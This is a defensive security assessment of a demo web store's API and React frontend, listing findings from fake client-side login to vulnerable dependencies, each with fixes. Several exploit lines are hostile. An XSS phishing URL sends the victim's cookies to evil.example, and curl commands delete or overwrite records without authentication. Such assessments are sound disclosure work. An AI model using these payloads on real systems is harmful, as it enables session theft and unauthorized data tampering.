# OctoCAT Supply Chain — Security Assessment

**Scope:** `api/` (Express + SQLite), `frontend/` (React + Vite), `infra/`, `docker-compose.yml`, container images.
**Method:** Manual source review (routes, repositories, DB layer, auth context, Docker/nginx config) + `npm audit` against `api/package-lock.json` and `frontend/package-lock.json`.
**Not in scope:** Dynamic/black-box testing, GitHub Actions workflow security (separate concern), infra IAM review.

> Note: some findings below (the fake `AuthContext`) match patterns described in `.github/prompts/code-injection.prompt.md` and the repo's GHAS demo tasks (`.vscode/tasks.json`). They appear intentionally present for security-tooling demonstrations. **They are documented here as real, exploitable vulnerabilities in the current `main`/`feature/cart` code regardless of original intent**, since the code executes as-is if deployed.

> **Resolved:** Findings 1 (OS command injection via delivery notify) and 2 (SQL injection in product name search) have been fixed and removed from this assessment. See [api/src/routes/delivery.ts](api/src/routes/delivery.ts) (now uses `execFile` with an allowlist of delivery partners instead of shell `exec`) and [api/src/repositories/productsRepo.ts](api/src/repositories/productsRepo.ts) (now uses a parameterized `LIKE ?` query instead of string interpolation).

---

## Summary Table

| # | Finding | Category | Severity |
|---|---|---|---|
| 3 | No real authentication (client-side-only login) | AuthN | **Critical** |
| 4 | No authorization on any API route | AuthZ | **Critical** |
| 5 | Reflected XSS via `dangerouslySetInnerHTML` | XSS | **Critical** |
| 6 | Cart identity derived from weak client-supplied hash | AuthZ / IDOR | High |
| 7 | Missing security headers (API & frontend) | Security misconfig | High |
| 8 | Vulnerable production dependencies (axios, react-router-dom, express toolchain) | Dependencies | High |
| 9 | API container runs as root | Security misconfig | High |
| 10 | Internal error details leaked to clients | Info disclosure | High |
| 11 | Permissive CORS with credentials + wildcard subdomain regexes | Security misconfig | Medium |
| 12 | Self-asserted ownership tokens for ratings/comments | AuthZ | Medium |
| 13 | Inconsistent / hand-rolled input validation | Input validation | Medium |
| 14 | No rate limiting / brute-force protection | AuthN/DoS | Medium |
| 15 | Swagger UI + full OpenAPI JSON exposed unauthenticated | Info disclosure | Low |
| 16 | Dev-only vulnerable dependencies (vite, rollup, vitest, minimatch, etc.) | Dependencies | Low |

---

## 1. Authentication & Authorization

### Finding 3 — No real authentication (Critical)
**Files:** [frontend/src/context/AuthContext.tsx](frontend/src/context/AuthContext.tsx), [frontend/src/components/Login.tsx](frontend/src/components/Login.tsx)

`AuthContext.login()` never calls a backend endpoint. Any non-empty `email`/`password` pair succeeds, and `isAdmin` is set purely from `email.endsWith('@github.com')`:

```ts
const login = async (email: string, password: string) => {
  if (email && password) {
    setIsLoggedIn(true);
    setIsAdmin(email.endsWith('@github.com'));
  }
};
```

- **Risk:** There is no credential verification, no session/JWT issuance, and no server round-trip at all. "Admin" status is a string check performed entirely in the browser.
- **Exploit:** Type any string ending in `@github.com` (e.g. `attacker@github.com`) with any password to become "admin" in the UI. Because state lives only in React memory, it's also trivially set via browser dev tools or by calling API endpoints directly (see Finding 4) — the UI gating is cosmetic.
- **Remediation:** Implement real server-side authentication (e.g., OIDC/session cookies or JWT issued by the API after verifying credentials against a hashed-password store, such as bcrypt/argon2). Derive `isAdmin`/roles from a verified, signed token or session claim — never from client-supplied strings. Until real auth exists, treat every "admin" UI affordance as decorative only.

### Finding 4 — No authorization on any API route (Critical)
**Files:** all of `api/src/routes/*.ts` (branch, cart, delivery, headquarters, order, orderDetail, orderDetailDelivery, product, productComment, rating, supplier)

No route in the API checks an `Authorization` header, session, or role. Every `POST`/`PUT`/`DELETE` (create/update/delete suppliers, products, orders, deliveries, headquarters, branches) is reachable by any anonymous client.

- **Risk:** Full read/write/delete access to core business data (pricing, inventory, suppliers, order routing) with no identity check.
- **Exploit:** `curl -X DELETE http://api/api/products/1` or `curl -X PUT http://api/api/suppliers/1 -d '{"name":"pwned"}'` succeeds with no credentials.
- **Remediation:** Add an authentication middleware (verifying a session/JWT) applied globally via `app.use()`, then role-based authorization middleware on mutating routes (`requireRole('admin')` for admin-only writes). Fail closed (403) by default; explicitly allowlist public read endpoints.

---

## 2. Input Validation Weaknesses

### Finding 13 — Inconsistent / hand-rolled input validation (Medium)
**Files:** [api/src/routes/delivery.ts](api/src/routes/delivery.ts), [api/src/routes/order.ts](api/src/routes/order.ts), [api/src/routes/orderDetail.ts](api/src/routes/orderDetail.ts), [api/src/routes/orderDetailDelivery.ts](api/src/routes/orderDetailDelivery.ts)

Several routes pass `req.body` straight into repository `create`/`update` calls with zero shape/type validation (e.g. `delivery.ts`: `repo.update(parseInt(req.params.id), req.body)`), while other routes (rating.ts, cart.ts) hand-roll ad-hoc checks. There is no shared schema-validation library (zod/joi/express-validator/ajv-based request validation).

- **Risk:** Type confusion, unexpected fields silently written to the DB (mass assignment against `buildUpdateSQL`, which will happily write any camelCase key present on the object as a column), and inconsistent error responses.
- **Exploit:** `PUT /api/deliveries/1` with `{"status": {"$ne": null}, "extraColumn": "x"}` — the object is passed to `buildUpdateSQL` un-vetted; if the key coincidentally maps to a real column, unintended columns can be overwritten.
- **Remediation:** Introduce a single validation layer (zod schemas per model, validated in middleware before the handler runs) shared by all routes; reject unknown fields explicitly.

---

## 3. Injection Vulnerabilities

No open injection findings. Findings 1 (OS command injection in `delivery.ts`) and 2 (SQL injection in `productsRepo.findByName`) were identified here and have since been remediated — see the note at the top of this document.

---

## 4. XSS Vulnerabilities

### Finding 5 — Reflected XSS via `dangerouslySetInnerHTML` (Critical) — CWE-79
**File:** [frontend/src/components/Login.tsx](frontend/src/components/Login.tsx#L18-L49)

```tsx
useEffect(() => {
  const errorMsg = searchParams.get('error');
  if (errorMsg) setError(errorMsg);
}, [searchParams]);
...
{error && (
  <div className="..." dangerouslySetInnerHTML={{ __html: error }} />
)}
```

- **Risk:** The `error` query-string parameter is read verbatim from the URL and rendered as raw HTML.
- **Exploit:** Phishing link `https://app.example.com/login?error=<img src=x onerror=fetch('https://evil.example/steal?c='+document.cookie)>` — any victim who clicks it executes attacker JS in the app's origin (session/token theft, further requests as the victim, defacement).
- **Remediation:** Never render user/URL-controlled content with `dangerouslySetInnerHTML`. Render `error` as plain text: `<div>{error}</div>` (React escapes by default). If HTML formatting is genuinely required, sanitize with a vetted library (e.g., DOMPurify) and use an allowlist of tags — but for a login error string, plain text is correct.

---

## 5. Sensitive Data Exposure

### Finding 10 — Internal error details leaked to clients (High, resolved for this instance)
**File:** [api/src/routes/delivery.ts](api/src/routes/delivery.ts)

This finding previously cited the `notify` command handler returning raw `Error.message` to the client. That code path was rewritten as part of the Finding 1 (command injection) fix and now returns a generic `NOTIFY_FAILED` message instead of the raw error. No other ad-hoc `res.status(500).json({ error: error.message })`-style leaks were found elsewhere in the API during this review, but keep watching for the pattern as new routes are added.

- **Remediation:** Route all error responses through the existing `errorHandler` middleware in [api/src/utils/errors.ts](api/src/utils/errors.ts) instead of ad-hoc `res.status(...).json(...)` calls, for consistent, non-leaky formatting.

### Finding 15 — Swagger UI / OpenAPI JSON exposed unauthenticated (Low)
**File:** [api/src/index.ts](api/src/index.ts#L69-L78)

`/api-docs` and `/api-docs.json` are mounted with no gating, exposing the full API surface (including the `deliveryPartner` notify parameter and header-token schemes) to anyone.

- **Remediation:** Restrict Swagger UI to non-production environments, or place it behind authentication in production deployments.

No hardcoded secrets, API keys, or credentials were found in application source (`api/`, `frontend/`, `infra/`). `infra/container-apps.bicep` correctly marks the registry password `@secure()`, and CI workflows reference `secrets.*` context values rather than literals. `api/.env.example` is a template only. This area is otherwise clean — keep it that way (see remediation plan item on secret-scanning).

---

## 6. Dependency / Package Vulnerabilities

`npm audit` (run against current lockfiles, network-enabled) results:

**`api/` — 17 advisories (2 critical, 12 high, 3 moderate)**
- Production-impacting: `express`/`body-parser`/`qs`/`path-to-regexp` chain (High — ReDoS / silent size-limit bypass in `body-parser <=1.20.5`).
- Dev/build-only: `@vitest/coverage-v8`/`vitest` (Critical — arbitrary file read/execute via Vitest UI server, only relevant if a dev/CI UI server is exposed), `js-yaml`, `minimatch`, `picomatch`, `brace-expansion`, `flatted`, `nanoid`, `ajv`, `form-data` (ReDoS/DoS/prototype-pollution class issues in tooling).

**`frontend/` — 18 advisories (1 critical, 14 high, 2 moderate, 1 low)**
- Production-impacting:
  - `axios@1.8.1` (High) — chain of advisories including SSRF via absolute URL / `NO_PROXY` bypass, prototype-pollution-based response tampering / credential injection, header injection, CRLF injection.
  - `react-router-dom@7.4.1` → `react-router` (High) — XSS via open redirect, stored XSS via unescaped `Location` header in prerendered redirects, CSRF issues, DoS via inefficient route matching.
  - `follow-redirects` (Moderate, transitive via axios) — leaks custom auth headers across cross-domain redirects.
- Dev/build-only: `vite@7.2.6`, `rollup`, `postcss`, `minimatch`, `picomatch`, `js-yaml`, `brace-expansion`, `nanoid`, `flatted`, `ws`, `@babel/core`, `ajv`, `vitest` (mostly ReDoS/DoS/path-traversal in the dev server and build pipeline).

- **Risk:** The production-impacting items (axios, react-router-dom, express toolchain) run in the deployed app and browser, so they're directly exploitable against real users/traffic, not just local dev machines.
- **Remediation:** `npm audit fix` / bump `axios` and `react-router-dom` to patched majors/minors compatible with the app; re-test. Update `express` (and transitively `body-parser`, `path-to-regexp`) to latest 4.x/5.x patched line. Add a scheduled Dependabot/`npm audit --production` CI gate to catch regressions (see remediation plan). Dev-only tooling should still be patched on a normal cadence but is not an emergency unless dev servers are exposed to untrusted networks.

---

## 7. Insecure API Implementations

- **No global auth/authz** (Finding 4).
- **No rate limiting** anywhere (Finding 14) — combined with no auth, this allows unrestricted automated scraping/mutation and brute-forcing of rating/comment tokens (Finding 12).
- **Mass-assignment risk** via `buildUpdateSQL(table, req.body, ...)` patterns with no field allowlist (Finding 13) — e.g. `orders.ts`/`delivery.ts` update handlers.
- **CORS** allows `credentials: true` combined with regex-matched wildcard origins (`/^https:\/\/.*\.app\.github\.dev$/`, `/^https:\/\/.*\.azurecontainerapps\.io$/`) (Finding 11) — reasonable for the intended Codespaces/ACA demo environments, but should be tightened (or disabled) for any environment holding real data, since any tenant under those wildcard domains would be treated as a trusted origin for credentialed requests.
- **Cart identity** derived from a client-controlled header hashed with a non-cryptographic 32-bit FNV-1a hash (Finding 6) rather than a server-issued session — collisions and guessing let one user address another user's cart.

### Finding 6 — Cart identity from weak client-supplied hash (High)
**File:** [api/src/routes/cart.ts](api/src/routes/cart.ts#L134-L143)

```ts
function cartKeyToUserId(cartKey: string): number {
  let hash = 2166136261;
  for (let i = 0; i < cartKey.length; i += 1) {
    hash ^= cartKey.charCodeAt(i);
    hash = Math.imul(hash, 16777619);
  }
  return (hash >>> 0) || 1;
}
```

- **Risk:** `X-Cart-Key` is entirely client-chosen and unauthenticated; the resulting `userId` space is only 32 bits and non-cryptographic, so collisions are computationally easy to find, and there is no proof of ownership over a cart key.
- **Exploit:** An attacker who learns/guesses another shopper's cart key (e.g., leaked via logs, referrer headers, or brute force since there's no rate limiting) can view and mutate that cart (add/remove items) with a simple header change — no session validation exists.
- **Remediation:** Issue cart keys server-side as cryptographically random, unguessable tokens (e.g., 128-bit UUID/`crypto.randomBytes`) tied to a signed cookie or session, and validate that the request actually owns the key (e.g., HMAC-signed key, or associate keys with an authenticated session once real auth exists).

---

## 8. Missing Security Headers

**Files:** [api/src/index.ts](api/src/index.ts), [frontend/nginx.conf](frontend/nginx.conf)

Neither the Express API nor the nginx-served frontend sets any hardening headers:
- No `Content-Security-Policy`
- No `X-Frame-Options` / `frame-ancestors` (clickjacking)
- No `X-Content-Type-Options: nosniff`
- No `Strict-Transport-Security`
- No `Referrer-Policy`
- No `Permissions-Policy`
- Express does not use `helmet` (not in `api/package.json` dependencies).

- **Risk:** Increases impact of the XSS finding (no CSP to blunt it), enables clickjacking of the frontend in an iframe, allows MIME-sniffing attacks, and provides no baseline browser-side defense-in-depth.
- **Remediation:** Add `helmet()` middleware to the Express app with a tuned CSP; add the equivalent headers via `add_header` directives in `nginx.conf` (CSP, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, HSTS at the TLS-terminating layer).

---

## 9. Secrets or Credentials in Code

No hardcoded secrets, credentials, private keys, or connection strings were found in `api/`, `frontend/`, or `infra/` source. Highlights of good practice already in place:
- `infra/container-apps.bicep` marks `containerRegistryPassword` with `@secure()`.
- GitHub Actions workflows reference `secrets.*` / `vars.*` context, not literal values.
- `api/.env.example` contains placeholder values only.

**Caution:** `.vscode/tasks.json` includes demo tasks (`GHAS: Inject Secrets`, `GHAS: Inject Dependabot Vulnerable Action`) that intentionally patch in secrets/vulnerable code on demo branches (see `demo/resources/secret-scanning/`, `demo/resources/dependabot/`). Ensure these patch sets are **never applied to `main`** or any branch that gets deployed, and that secret-scanning/push-protection remains enabled on the repository to catch accidental promotion of demo content.

---

## 10. General OWASP Top 10 Mapping

| OWASP 2021 Category | Applicable Findings |
|---|---|
| A01 Broken Access Control | 3, 4, 6, 12 |
| A02 Cryptographic Failures | 6 (non-crypto hash used as identity) |
| A03 Injection | _(resolved — see note above)_ |
| A04 Insecure Design | 3, 4, 6, 12, 14 (no auth/session model designed at all) |
| A05 Security Misconfiguration | 7, 9, 11, 15 |
| A06 Vulnerable and Outdated Components | 8, 16 |
| A07 Identification and Authentication Failures | 3, 12, 14 |
| A08 Software and Data Integrity Failures | 13 (mass assignment) |
| A09 Security Logging and Monitoring Failures | 10 (errors only console-logged, no structured/alertable logging) |
| A10 SSRF | 8 (axios SSRF advisories, latent risk if any endpoint proxies user-supplied URLs) |

---

## Prioritized Remediation Plan

### P0 — Fix immediately (Critical, exploitable today, no auth required)
1. ~~Remove command injection in `delivery.ts`~~ — **Done.** Now uses `execFile` with an argument array plus an allowlist of known delivery partners. *(Finding 1 — resolved)*
2. ~~Fix SQL injection in `productsRepo.findByName`~~ — **Done.** Now uses a parameterized `LIKE ?` query. *(Finding 2 — resolved)*
3. **Fix reflected XSS** in `Login.tsx` — render `error` as text, not via `dangerouslySetInnerHTML`. *(Finding 5)*

### P1 — Fix before any production/public deployment
4. **Implement real authentication** (server-verified credentials, hashed passwords, signed session/JWT) and remove the client-only `AuthContext` trust model. *(Finding 3)*
5. **Add authorization middleware** to the API; require auth for all mutating routes and admin role for admin-only operations. *(Finding 4)*
6. **Replace cart key scheme** with server-issued, cryptographically random keys bound to a session/HMAC. *(Finding 6)*
7. **Add `helmet` to Express and hardening headers to `nginx.conf`** (CSP, X-Frame-Options, nosniff, HSTS, Referrer-Policy). *(Finding 7)*
8. **Upgrade `axios` and `react-router-dom`** (and transitively `express`/`body-parser`) to patched versions; re-run `npm audit` to confirm zero high/critical in production dependency trees. *(Finding 8)*
9. **Run API container as a non-root user**; add `USER node` (or a dedicated UID) in `api/Dockerfile`. *(Finding 9)*
10. **Stop leaking raw error messages**; route all error responses through the shared `errorHandler`. *(Finding 10)*

### P2 — Harden before scaling / handling real user data
11. Tighten CORS: remove wildcard-domain regexes (or scope them to demo environments only) when `credentials: true` is set; consider disabling credentialed CORS entirely if no cookies/sessions are needed yet. *(Finding 11)*
12. Replace self-asserted ownership tokens for ratings/comments with server-issued, unguessable tokens (and eventually bind to real auth). *(Finding 12)*
13. Introduce a shared request-validation layer (zod/express-validator) across all routes with explicit field allowlists to prevent mass assignment. *(Finding 13)*
14. Add rate limiting (e.g., `express-rate-limit`) globally and stricter limits on mutation endpoints and token-guarded endpoints. *(Finding 14)*

### P3 — Lower urgency cleanup
15. Gate `/api-docs` and `/api-docs.json` behind auth or disable in production builds. *(Finding 15)*
16. Patch remaining dev-tooling advisories (`vite`, `rollup`, `vitest`, `minimatch`, `picomatch`, `js-yaml`, `brace-expansion`, `postcss`, `nanoid`, `flatted`, `ajv`, `ws`, `@babel/core`) on a normal update cadence; ensure dev/CI servers (Vitest UI, Vite dev server) are never exposed to untrusted networks. *(Finding 16)*
17. Add automated dependency scanning (Dependabot alerts + `npm audit --audit-level=high` in CI) and CodeQL/secret-scanning as standing checks so these regressions are caught automatically going forward.

---

*No code changes have been made as part of this assessment. This document only records findings and recommended remediations for review and planning.*
